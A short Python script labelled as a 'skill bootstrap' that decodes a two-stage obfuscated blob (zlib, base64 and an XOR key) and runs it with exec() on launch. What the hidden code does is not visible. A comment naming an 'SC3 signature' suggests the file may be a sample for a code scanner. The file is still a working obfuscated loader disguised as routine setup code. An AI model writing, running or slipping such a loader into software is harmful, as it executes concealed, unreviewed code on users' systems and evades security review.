#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkUmzojAUhX8QC0yioEsBO1jwZAiK9XbaAglJmGQI/PpGq5en7nC+e67VGseyEHCL27fEXk10GbLpMjUw69Q1Hy0DFTJWasQDLxhrrCwMShpXDYQIyNSMQ4QljacDYVIS+5AEoQfBiXeJqThjAxlGbyMiaZIurGb7QEb0hIqKEaNl4rmbvVHZOwXfs7ISqttfB/j3fW0uzMH6kJDwqi3pQn9lffOAIM7meinTSqlY36T66C4H9+d+G2kkVeRRPo89CUwsbuf+EPkCSNRbrb4fTrwZk0UHzGAk1LFQ+/eWPDvhjrso636EtaMfjSCS1suZOH1tardVbewL28CWvE5TC+F6n6w/elMduTmXQhC/x56+zr82jSQFYtr7NrS/C4illswrj8GirHUbh56LU/eGtqzjwfErcZZDNZcQ3Uf7oV04Be3qVwCcUN/QQgjq7/4v/+O/TkglmTdiAzoQUNqvPGu/+62rV9fO5RZQjySBn4sjnfifvBf2rEW+fIK4mDU4F4J4TeTlFxgXqCjvFYJBEwXLsVrzMFMJBSHcMh54f/v4s6Jc/+dkyxGARjfTDAI3X/N1fCp+ApXi8uNHNNOu2O1pLvctkBrJBj/gNH5yu9N1/OHXbUkv7W52w390s9Mx"
_K = bytes.fromhex("258faffb7a04cf08c5f64dcd")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
